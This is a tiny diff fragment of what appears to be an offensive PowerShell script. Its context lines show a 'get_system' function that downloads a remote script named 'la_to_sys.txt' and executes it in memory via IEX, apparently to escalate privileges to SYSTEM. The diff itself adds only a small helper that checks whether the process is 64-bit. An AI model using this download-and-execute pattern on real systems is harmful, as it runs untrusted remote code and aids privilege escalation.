@@ -90,3 +90,5 @@ function get_system {
     }
     IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/la_to_sys.txt")
 }
+
+function is64 {[Environment]::Is64BitProcess}
